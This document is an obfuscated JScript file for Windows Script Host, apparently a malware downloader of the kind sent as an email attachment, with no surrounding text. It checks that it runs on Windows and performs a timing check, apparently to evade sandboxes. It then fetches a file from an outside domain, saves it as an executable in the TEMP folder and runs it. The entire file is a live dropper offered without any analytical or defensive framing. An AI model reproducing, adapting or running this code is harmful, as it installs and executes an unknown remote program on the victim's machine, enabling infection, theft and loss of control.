var zN = false;
var XX = "CreateObject";
var b0 = function F() {return WScript[XX]("WScript.Shell");}(), Q = 11;
var qq = "MSXML2.XMLHTTP";
var Nx = 2123213;
var w0 = 0;
function B(wq){b0["Run"](wq, w0, w0);};
function NA(){return "" + qq;};
function Is(Y, AE){w0 = w0 * 1; return Y - AE;};
function w(){return XX;};
/*@cc_on
  @if (@_win32 || @_win64)
    zN = true;
  @end
@*/
if (zN)
{
var lK = "";
function E(){return 22;};
var T = 0; var D = 0;
function u()
{
var b = new this["Date"]();
var Av = b["getUTCMilliseconds"]();
WScript["Sleep"](E());
var b = new this["Date"]();
var E0 = b["getUTCMilliseconds"]();
WScript["Sleep"](E());
var b = new this["Date"]();
var R = b["getUTCMilliseconds"]();
var T = "wJ";
T = Is(E0, Av);
var D = "v";
D = Is(R, E0);
lK = "open";
return Is(T, D);
}
var ph = false;
var a = false;
for (var q = w0; q < E() * 1; q++){if (u() != w0){
ph = true; 
D = "31" + 11 * T + D; 
a = true; 
break;
}}
function r() {return ((ph == true) && (ph == a)) ? 1 : w0;};
if (ph && r() && a){
function su() {return b0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "uzm0srP82.exe";};
 wy = NA();
 I = WScript[XX](wy);
 var h = 1;
 while (h){
try {
I[lK]("GET", "http://xn--kandypriv-j4a.com/lo4sad", false);
I["send"]();
ya = "Sleep";
for (;;){WScript[ya](E() * 11); if (I["readystate"] >= 2 * 2) break;};
h = w0;
} catch(m){};
}
function QJ(N) {var J = (1, 2, 3, 4, 5, N); return J;};
HC = WScript[w()]("ADODB.Stream");
wy = HC;
wy[lK]();
wy["type"] = QJ(1);
wy["write"](I["ResponseBody"]);
HC["position"] = QJ(w0);
wy["Save" + "ToFile"](su(), 2);
HC["c"+"lose"]();
t = su();
B(t);
}
}

